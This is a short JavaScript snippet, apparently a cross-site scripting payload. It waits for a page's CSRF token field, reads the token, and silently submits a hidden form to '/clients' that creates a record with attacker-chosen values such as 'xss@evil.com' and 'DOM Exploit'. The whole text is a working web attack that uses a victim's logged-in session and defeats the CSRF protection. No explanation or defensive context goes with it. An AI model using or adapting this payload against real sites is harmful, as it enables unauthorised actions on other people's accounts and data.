(function () {
  const waitFor = (sel, cb) => {
    const el = document.querySelector(sel);
    if (el) return cb(el);
    setTimeout(() => waitFor(sel, cb), 200);
  };

  waitFor('input[name="_token"]', tokenInput => {
    const token = tokenInput.value;

    const f = document.createElement('form');
    f.action = '/clients';
    f.method = 'POST';
    f.style.display = 'none';

    f.innerHTML = `
      <input name="client_name" value="Exploit">
      <input name="email" value="xss@evil.com">
      <input name="phone_number" value="0606060606">
      <input name="phone_type" value="mobile">
      <input name="address" value="DOM Exploit">
      <input name="_token" value="${token}">
    `;

    document.body.appendChild(f);
    f.submit();
  });
})();
